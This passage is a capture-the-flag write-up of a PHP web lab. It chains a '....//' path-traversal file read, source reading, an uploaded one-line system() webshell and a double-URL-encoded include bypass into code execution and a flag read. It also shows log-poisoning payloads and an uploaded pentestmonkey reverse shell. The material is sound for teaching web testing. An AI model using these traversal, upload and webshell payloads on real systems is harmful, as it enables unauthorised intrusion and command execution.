    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.2-fpm.sock;
    }

    location ^~ /regions/ {
        deny all;
    }

    location ^~ /uploads/ {
        deny all;
    }
}
```

Takeaways from the vhost:

- **`/var/www/html`** — document root → absolute path references now possible
- **`fastcgi_pass unix:/run/php/php8.2-fpm.sock`** — PHP-FPM 8.2 → its configs are readable next
- **`location ^~ /regions/ { deny all; }`** — a directory the site never mentions... filed for later
- **`location ^~ /uploads/ { deny all; }`** — almost certainly where `application.php` drops the uploaded resumes. HTTP-blocked — but a disk-read LFI doesn't care about nginx `location` rules at all

### 4.8 PHP-FPM configuration

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/php/8.2/fpm/php-fpm.conf'
```

```ini
;;
...standard FPM global block, all stock comments...
;;
[global]
pid = /run/php/php8.2-fpm.pid
error_log = /var/log/php8.2-fpm.log

;; log_level, log_limit, log_buffering, emergency_restart_*,
;; process_control_timeout, process.max, rlimit_*,
;; daemonize - all commented (defaults) ;;

;;;;;;;;;;;;;;;;;;;;
; Pool Definitions ;;
;;;;;;;;;;;;;;;;;;;;

include=/etc/php/8.2/fpm/pool.d/*.conf
```

The only live directive besides pid/error_log: **`include=/etc/php/8.2/fpm/pool.d/*.conf`**. Searching around, the default Debian pool file is `www.conf` — try it:

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/php/8.2/fpm/pool.d/www.conf'
```

```ini
[www]
user = www-data
group = www-data
listen = /run/php/php8.2-fpm.sock
listen.owner = www-data
listen.group = www-data

pm = dynamic
pm.max_children = 5
pm.start_servers = 2
pm.min_spare_servers = 1
pm.max_spare_servers = 3

;;access.log/slowlog/pm.status_path/ping.path — commented;
;;chroot — commented (no);
;;catch_workers_output — commented;
;;clear_env — commented (default yes);
;;security.limit_extensions = .php .php3 .php4 .php5 .php7 (commented → default);
;;env[HOSTNAME], env[PATH], env[TMP...], php_admin_value[...] — all commented;;
```

**The FPM configs are clean stock defaults**: no custom `env[]`, no `php_admin_value` secrets, no pools worth exploiting. This axis closes.

### 4.9 php.ini — the decisive grep

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/php/8.2/fpm/php.ini' > php.ini
grep -inE 'allow_url_(fopen|include)|disable_(functions|classes)|open_basedir|session\.(save_path|upload_progress)|file_uploads|upload_tmp_dir' php.ini
```

```ini
313:  ; open_basedir, if set, limits all file operations ...
318:  ;open_basedir =
323:  disable_functions =
328:  disable_classes =
846:  file_uploads = On
851:  ;upload_tmp_dir =
858:  max_file_uploads = 20
866:  allow_url_fopen = On
870:  allow_url_include = Off
374:  ;session.save_path = "/var/lib/php/sessions"
1544: ;session.upload_progress.enabled = On
1552: ;session.upload_progress.cleanup = On
1559: ;session.upload_progress.prefix = "upload_progress_"
1567: ;session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
```

Reading the values:

| Directive                               | Value                              | Meaning                                                                                                                      |
| --------------------------------------- | ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `disable_functions` / `disable_classes` | empty                              | no function jail                                                                                                             |
| `open_basedir`                          | unset (commented)                  | full filesystem access for the PHP user                                                                                      |
| `allow_url_fopen`                       | **On**                             | URL-wrappers allowed at the ini level                                                                                        |
| `allow_url_include`                     | **Off**                            | `include()` refuses URL-wrappers (`php://`, `data://`, `expect://`) — the RCE-via-wrapper road is closed at the config level |
| `file_uploads`                          | On                                 | uploads enabled                                                                                                              |
| `session.upload_progress.*`             | commented = **defaults (enabled)** | the PHP_SESSION_UPLOAD_PROGRESS technique is theoretically available                                                         |

### 4.10 Reading the application sources — the pivot

The webroot is known (`/var/www/html`) — read every script through LFI #1:

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/html/api/image.php'
```

```php
<?php
if (isset($_GET["p"])) {
    $path = "../images/" . str_replace("../", "", $_GET["p"]);
    $contents = file_get_contents($path);
    header("Content-Type: image/jpeg");
    echo $contents;
}
?>
```

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/html/api/application.php'
```

```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

Suddenly **everything is explained at once**:

1. **`str_replace("../", "", ...)` is non-recursive** — exactly why `....//` worked: one internal `../` survives the strip
2. **The prefix `"../images/"` is glued to the BEGINNING of every path** — this is why `php://` wrappers returned empty every time: for PHP to treat a string as a URL wrapper, the scheme must be the *first* characters of the string — and here `../images/` always precedes the input
3. **`file_get_contents` (not `include`)** — read-only: included files are *displayed*, never *executed*. This single line kills the entire log-poisoning family — and retroactively explains the failed poisoning tests below
4. **`Content-Type: image/jpeg`** — the script blindly claims a JPEG; anything text leaks fine anyway (as we saw with /etc/passwd)
5. **uploads**: saved as `../uploads/` + **`md5_file()` of the content** + `.` + extension from the original filename — **but md5 of uploaded bytes is computable in advance.** The name is entropy, not a secret

### 4.11 Dead end catalog — log poisoning (the methodical failure)

Before the sources were read, log poisoning had been tried **properly** — and lost — in three steps:

**Step 1: php://filter verification (empty)**

```sh
curl -s -i 'http://sumace.htb:PORT/api/image.php?p=php://filter/read=convert.base64-encode/resource=/etc/passwd'
HTTP/1.1 200 OK
Server: nginx/1.22.1
Content-Type: image/jpeg

(body empty)
```

At the time this was ambiguous (wrapper blocked? syntax wrong? — with `allow_url_fopen=On` from php.ini it shouldn't have been). The correct retro-reading: **no wrapper placement ever works through this script**, because the prefix is unconditional — even a scheme-first variant like `p=php://filter/.../resource=....//....//etc/passwd` still ends up as `../images/php://...` after concatenation, so PHP never recognizes a scheme. The test was doomed by design; the ambiguity was only resolvable by reading the source. (This is also why "I went down a different path" was the right instinct — not the payload's fault, the script's geometry.)

**Step 2: writing a payload into the log via User-Agent (succeeded) — but no execution**

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=poison' -A "<?php system($_GET['c']); ?>"
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/access.log&c=id'

186.205.133.5 - - [21/Oct/2026:21:01:12 +0000] "GET /api/image.php?p=poison HTTP/1.1" 200 5 "-" "<?php system($_GET['c']); ?>"
186.205.133.5 - - [21/Oct/2026:21:01:28 +0000] "GET ...access.log&c=id HTTP/1.1" 200 256118 "-" "curl/8.22.0"
```

The payload landed in the log **byte-for-byte unmodified** (single quotes chosen deliberately — nginx escapes `"`). But `id` never executed — the log came back as plain text.

**Step 3: eliminating the disable_functions hypothesis**

If `include` executes files but `system()` is disabled, a pure echo proves the difference with zero system calls:

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=echo1337' -A '<?php echo 1337; ?>'
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/access.log'

186.205.133.5 - - [21/Oct/2026:21:04:49 +0000] "GET /api/image.php?p=echo1337 HTTP/1.1" 200 5 "-" "<?php echo 1337; ?>"
```

`1337` never appeared. **Verdict: files are read, not executed.**

| Hypothesis                                     | Status                                           |
| ---------------------------------------------- | ------------------------------------------------ |
| Arbitrary bytes written into access.log via UA | works                                            |
| PHP execution from the included file           | the script reads, not includes                   |
| php://filter wrappers                          | empty — the prefix breaks the scheme             |
| `system()` in disable_functions                | unlikely — a clean `echo 1337` didn't run either |

**Log poisoning falls away completely** — and the reason is now known precisely, straight from the source: `file_get_contents`.

### 4.12 The upload-a-reverse-shell idea (three walls)

The natural next thought: `application.php` accepts ANY file (even a `.php` reverse shell — tested, stored fine). Open it via `/uploads/revshell.php`?

No — three separate blockers:

1. **The name is not the original**: the server stores it as `../uploads/<md5-of-content>.<ext>` — computable in advance (a hurdle, not a wall)
2. **`location ^~ /uploads/ { deny all; }`** — direct HTTP access → 403; traversal like `/uploads/../api/x.php` gets URI-normalized by nginx into the same denied location
3. **The killer**: even if we reached it — **nothing executes it**. The only known file-handling function is `file_get_contents` + `echo`. A `.php` file fetched through LFI would render its **source as text**, not run it — already proven in the echo-1337 experiment

### 4.13 Pivoting to the include — reading yet more sources

The fixed rule after Phase 4: **read every remaining script**. `thanks.php` (the redirect target of `application.php`):

```php
# /var/www/html/thanks.php — full render (fetched through LFI #1):
...
<h1>Thanks for applying, <?=htmlentities((isset($_GET["n"])) ? $_GET["n"] : "[object Object]")?>!</h1>
...
```

`n` (= firstName, fully attacker-controlled via the URL) is passed through `htmlentities()` — protected even for XSS. No LFI here — dead branch, closed honestly.

The upload itself was also confirmed in practice — a full `php-reverse-shell.php` upload:

```http
POST /api/application.php HTTP/1.1
Host: sumace.htb:PORT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3nFD2edG0bp73Yve

------WebKitFormBoundary3nFD2edG0bp73Yve
Content-Disposition: form-data; name="firstName"

robert
------WebKitFormBoundary3nFD2edG0bp73Yve
Content-Disposition: form-data; name="lastName"

polson
------WebKitFormBoundary3nFD2edG0bp73Yve
Content-Disposition: form-data; name="email"

email@email.com
------WebKitFormBoundary3nFD2edG0bp73Yve
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.php"
Content-Type: application/x-php

<?php
// php-reverse-shell - pentestmonkey, 2007
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.x.x.x';   // CHANGE THIS (our VPN/attacker IP)
$port = 4444;       // CHANGE THIS
...
[full pentestmonkey reverse shell — host it, listener on 4444, proc_open('/bin/sh -i'), stream_select loop]
...
?>

------WebKitFormBoundary3nFD2edG0bp73Yve
Content-Disposition: form-data; name="notes"

aaaa
------WebKitFormBoundary3nFD2edG0bp73Yve--
```

```http
HTTP/1.1 302 Found
Server: nginx/1.22.1
Location: /thanks.php?n=robert
Content-Length: 0
```

Upload worked. Followed by parameter fuzzing on `thanks.php?p=FUZZ` (LFI-Jhaddix) — nothing; `thanks.php` renders the same template regardless.

Also read: `index.php`, `dashboard.php` (fetched by hash-reference reading) — nothing sensitive.

But then — **`contact.php`**, the endpoint whose *rendered* page had never changed... fetched through LFI:

```php
$region = "AT";
$danger = false;

if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);
    }
}

if (!$danger) {
    include "./regions/" . $region . ".php";
}
```

**A second file parameter — found ONLY by reading sources, invisible to every fuzzer** — and this time behind an `include` (execute-family!). The filter is more interesting too:

- dots and slashes are forbidden **in the post-PHP-decode value** (PHP automatically decodes `%XX` once)
- ...but then the code itself calls `urldecode()` **again** — the second decoding layer is the bypass: keep the value as `%2e%2e%2f` after the first decode (= clean for the filter), and `urldecode()` unfolds it into `../`
- the suffix `.php` is appended by the code itself → reading arbitrary non-PHP files is blocked... *but* the uploaded shell already IS `.php` — the suffix aligns perfectly: `./regions/../uploads/<md5>.php`
- `deny all` on `/uploads/` stops mattering: nginx never sees an `/uploads/*` request — the include is resolved by PHP-FPM directly on disk

### 4.14 Verification ladder for the region-include

Each step separate, minimal payloads (port rotates: `30273` this run):

**(0/1) Filter is alive**

```sh
curl -s 'http://sumace.htb:30273/contact.php?region=../etc/passwd'
# 'region' parameter contains invalid character(s)
```

**(2) Double encoding passes, but wrong target**

```sh
curl -s -i 'http://sumace.htb:30273/contact.php?region=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
HTTP/1.1 200 OK
... (page renders, <p> empty)

<p>
</p>
```

Empty — but this is **nearly a success**: no "invalid character(s)" message means the double encoding was unfolded by `urldecode()` — the include used `./regions/../../../etc/passwd.php`... nonexistent (the extension strikes). A silent include-fail, not a filter fail.

**(3) A path where `.php` completion makes sense — the decisive test**

`/var/www/html/regions/../apply.php` exists and completes naturally with the appended extension:

```sh
curl -s 'http://sumace.htb:30273/contact.php?region=%252e%252e%252fapply'
```

Result: the **full Apply form (First Name / Last Name / Upload) rendered inside the Contact page** — `include` + traversal + double-encoding bypass confirmed 100%.

### 4.15 RCE — upload → predictable name → include

No listener, no reverse shell necessary this time: **the webshell output renders directly inside the HTTP response** (commands ride in the same URL as a GET parameter; the include shares the request scope):

```sh
md5sum webshell.php
50f2492cd9733751b471f4f88be1ff3d  webshell.php
```

**Step 1 — confirm the file landed** (via read-LFI, note the `.php` suffix in the path — without it you fetch a nonexistent bare-hash name):

```sh
curl -s -i 'http://sumace.htb:30273/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/html/uploads/50f2492cd9733751b471f4f88be1ff3d.php'
HTTP/1.1 200 OK
Content-Type: image/jpeg

<?php system($_GET["cmd"]);?>
```

Source visible raw → file present, uploaded bytes exactly as sent.

**Step 2 — trigger through the region-include:**

```sh
curl -s 'http://sumace.htb:30273/contact.php?region=%252e%252e%252fuploads%252f50f2492cd9733751b471f4f88be1ff3d&cmd=id'
<html>
    ...page template...
    <p>
        uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- webshell achieved
    </p>
    ...page template...
</html>
```

`&cmd=id` follows the same URL; `system($_GET["cmd"])` inside the included webshell picks it from the shared GET scope.

**Step 3 — local enumeration straight through `cmd=`:**

```sh
curl -s 'http://sumace.htb:30273/contact.php?region=%252e%252e%252fuploads%252f50f2492cd9733751b471f4f88be1ff3d&cmd=ls%20-la'
total 16
drwxrwxrwx. 1 www-data www-data   21 Sep  2  2025 .
drwxr-xr-x. 1 root     root       18 Aug 19  2025 ..
drwxrwxrwx. 1 www-data www-data   46 Sep  2  2025 api
-rwxrwxrwx. 1 www-data www-data 1820 Sep  2  2025 apply.php
-rwxrwxrwx. 1 www-data www-data 1848 Aug 14  2024 contact.php
drwxrwxrwx. 1 www-data www-data   24 Aug 13  2024 css
drwxrwxrwx. 1 www-data www-data   86 Aug 13  2024 images
-rwxrwxrwx. 1 www-data www-data 3405 Aug 14  2024 index.php
drwxrwxrwx. 1 www-data www-data   48 Aug 13  2024 regions
-rwxrwxrwx. 1 www-data www-data 1142 Aug 14  2024 thanks.php
drwxrwxrwx. 1 www-data www-data   50 Oct 23 19:50 uploads

curl -s 'http://sumace.htb:30273/contact.php?region=%252e%252e%252fuploads%252f50f2492cd9733751b471f4f88be1ff3d&cmd=ls%20-la%20/'
drwxr-xr-x.    1 root root    50 Oct 23 18:44 .
lrwxrwxrwx.    1 root root     7 Aug 11  2025 bin -> usr/bin
drwxr-xr-x.    5 root root   340 Oct 23 18:44 dev
drwxr-xr-x.    1 root root    19 Oct 23 18:44 etc
-r--r--r--.    1 root root    32 Aug 14  2024 flag_09ebca.txt        <-- the flag
drwxr-xr-x.    1 root root     0 Oct 23 18:44 proc
drwx------.    1 root root    22 Sep  2  2025 root
drwxrwxrwt.    1 root root     6 Oct 23 19:50 tmp
...
```

**Step 4 — the flag, one `cmd=` away** (note the file is world-readable, `r--r--r--` — no privesc needed at all):

![[Articles/LFI Articles/fa_flag_read.png]]

```bash
curl -s 'http://sumace.htb:30273/contact.php?region=%252e%252e%252fuploads%252f50f2492cd9733751b471f4f88be1ff3d&cmd=cat%20/flag_09ebca.txt'
# (transcription of the actual command from the run; see the screenshot above — cat /flag_09ebca.txt through the same webshell)
```

> **Note:** in the live run the flag was first located via `ls -la /`, then read with `cmd=cat%20/flag_09ebca.txt` — world-readable, `r--r--r--`, no privesc needed.

### 4.16 What the assessment teaches

| Step | Technique |
|---|---|
| 1 | parameter candidate found by reading the rendered page (`image.php?p=hash`) |
| 2 | payload-wordlist fuzzing (LFI-Jhaddix) → `....//` non-recursive filter bypass → LFI #1 |
| 3 | custom server-file wordlist → nginx configs + logs readable |
| 4 | **methodical elimination of dead ends** (php://filter, log poisoning, disable_functions, uploaded-revshell access) — three cheap negative results each killing a whole attack family |
| 5 | source code of `image.php`/`application.php` through LFI #1 → read-only verdict, prefix revelation, md5-name scheme |
| 6 | reading yet more sources → `contact.php?region=` — second LFI of the **include** family, hidden from any fuzzer |
| 7 | double URL-encoding bypass → verification ladder via `../apply` → upload + `md5_file` predictability → webshell at a known path → RCE rendered into the HTTP response → flag |

The chain only opens **because every step feeds the next one**: fuzzing finds LFI #1; LFI #1 reads configs (webroot, protected dirs, PHP version); configs make source paths known; sources reveal the second parameter AND retroactively explain every failure; the second parameter's filter dictates the payload; the upload form supplies the payload's host file with a computable name.

**Generalized lessons (culled from the log):**

1. **Fuzzing does not replace reading the source.** The parameter that mattered (`region`) never surfaced in fuzzing output; Burp parameter lists cannot see what isn't in the page's GET strings.
2. **`include` vs `read` decides everything.** Log poisoning, session poisoning, wrappers, RFI — all die at `file_get_contents`. Prove the family early (do PHP files render as HTML instead of showing source? does including its own script 500 the server? is the source visible at all?).
3. **A hardcoded path prefix kills URL wrappers silently** — empty responses with no errors mean "scheme never resolved", not "no wrappers supported".
4. **Double URL encoding** bypasses filters that validate after PHP's auto-decode but then urldecode again themselves — check both decode layers whenever the code does its own decoding.
5. **A hardcoded suffix in include is a bug AND a hint** — reading non-PHP files is dead, but an upload form that lets you *choose* the extension lines up perfectly.
6. **Server-side rename schemes are entropy, not secrets.** `md5_file()` hashes the transferred bytes — computable before upload.
7. **Honest dead ends build the map.** Each eliminated hypothesis was worth 1-2 requests; payload guessing in the void costs hours and hides the real question ("which function is it?").
8. **Webshell > reverse shell** in NAT/container environments: execution is embedded in ordinary HTTP responses, no callbacks, no tunnels.


## 6. What I missed — and what I could have done better

Honest post-mortem of my own run. The chain worked, but each item below is a place where I lost time by trusting payloads over sources, or skipped a cheap diagnostic.

### 6.1 "Which function is it?" — answered 2 phases too late

The include-vs-read question sat untested from the moment LFI #1 was confirmed. I attacked log poisoning, tested `disable_functions`, fumbled with wrappers — **three whole phases** — before asking the only question that mattered. The cheapest possible answer was one request at Phase 2, before any escalation attempts:

```sh
# self-include marker: include the script itself through its own LFI
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/html/api/image.php'
# read-family  → the source comes back as plain text
# include-family → recursion → HTTP 500
```

Either outcome answers the question in one request. Everything I did between Phase 2 and Phase 5 would have been Minecraft-ified into "read the source" if I had run this first.

### 6.2 The php://filter ambiguity — a test I never ran

My php://filter attempts returned empty, and I parked two competing theories (wrapper blocked by ini vs app-level scheme filter) **without closing either**. The missing test was the scheme-first arrangement — wrapper scheme at the head of the input, traversal moved *inside* `resource`:

```sh
# hypothetical scheme-first payload (I never ran it):
curl -s 'http://sumace.htb:PORT/api/image.php?p=php://filter/read=convert.base64-encode/resource=....//....//....//etc/passwd'
```

Useful either way: if empty → the prefix explanation holds with an extra check; if content → the wrapper works and the whole read-only verdict was wrong. Lesson: **never leave two theories alive for multiple phases — pay the one request to disambiguate.** (In the final analysis the empty result was the prefix at work in *any* arrangement — the script prepends `../images/` unconditionally — but I learned that by reading the source, not by closing the hypothesis properly.)

### 6.3 contact.php — the source that closed the lab, read last

I read `index.php`, `dashboard.php`, `thanks.php` — and only then `contact.php`, which turned out to hold the actual include. Sequencing misstep: after confirming `file_get_contents` in `image.php`, the *first* thing to do is sweep **all sibling scripts in the same directory** (they're likely to share state/directories with the vulnerable one), not cherry-pick:

```sh
# batch-read every source before theorizing:
for f in contact.php thanks.php index.php apply.php api/image.php api/application.php; do
  curl -s "http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/html/$f" > src_$f
done
grep -l "include\|require\|eval\|exec" src_*
```

One batch — and the `region` include surfaces immediately, no guessing involved.

### 6.4 `%250A` in path payloads — self-inflicted decode damage

One of my trigger probes used a payload with `%250A` inside the path, and it silently broke:

```
%250A  →  two decode layers  →  literal newline glued to the file name
       payload becomes:  uploads/\n<md5>.php
       → file does not exist → silent empty response
```

Plus the same request carried one `../` more than the path needed. Both cost a debugging round-trip. **Rule:** after URL-processing payloads, print the final string you actually send (double-decode it mentally or locally) — payload typos are invisible in empty responses.

### 6.5 Content discovery inside `/api/` was never done

I fuzzed **parameters** heavily and **file names** never. The assessment only needed two api scripts, but a real target could hide another endpoint with a looser function — the difference between `include` and `read` might be exactly one undiscovered file away:

```bash
ffuf -u 'http://sumace.htb:PORT/api/FUZZ' \
     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -e .php -fc 404
```

### 6.6 The retro-summary for the lab note — worth duplicating here

What I walked away with:

1. **Read the source before escalating.** After the first LFI works, source-reading should be the *default next step*, not the fallback after payloads fail. Payload-first thinking cost me three phases.
2. **Close ambiguities with a request, not with a theory.** Competing hypotheses that survive more than one phase mean you're avoiding a test that already exists.
3. **Batch sibling reads.** The vulnerable parameter is hardly ever in the file you expected — but frequently in the directory you already know.
4. **Check your decoded payloads.** Double-encoded tricks garble easily (`%250A` → newline), and the failure mode is a silent, empty response.
5. **Fuzz files, not only parameters.** Parameter fuzzing found zero of the two parameters that mattered on this box; source reading found one, file discovery would have found the other.

---

### Severity (CVSS 3.1)

Two representative vectors bracket how bad LFI gets depending on which family the bug lands in:

| Scenario | CVSS 3.1 Vector | Score |
|---|---|---|
| **File disclosure only** (read-family, e.g. `file_get_contents`) — arbitrary file read, no execution | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | **7.5 — High** |
| **Inclusion → code execution** (include-family; arbitrary file read + unauthenticated webshell, C/I/A all dominated) | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | **9.8 — Critical** |

Reasoning behind the RCE vector:

- **`AV:N` (network)** — both LFI veins on the demonstration target were reachable by an unauthenticated HTTP request
- **`AC:L` (low)** — no obstacles beyond reading the app: no race, no special timing (`PHP_SESSION_UPLOAD_PROGRESS`-style races score differently), the double-decode bypass is deterministic
- **`PR:N` (none)** — `contact.php?region=` and the upload form both worked pre-authentication; if the vulnerable endpoint sat behind a login (like THM's `profile.php` admin app), it becomes `PR:L` → **8.8**
- **`S:U` (unchanged)** — RFI/SMB (+`S:C`) extensions aren't always present; this chain kept everything within one server process
- **`C:H / I:H / A:H`** — webshell = unrestricted shell commands as `www-data`: full read, full write (permanent shell in the webroot), and "delete the flag"/crash-the-box level effects

Note how a **single LFI bug** scores anywhere between 7.5 and 9.8+ purely depending on the function family and reach — the table above is exactly why the function matters more than the payload.

---

---

*(Possible follow-up topics: PHP wrappers in depth — filter chains, `phar://` deserialization, and LFI2RCE via iconv.)*
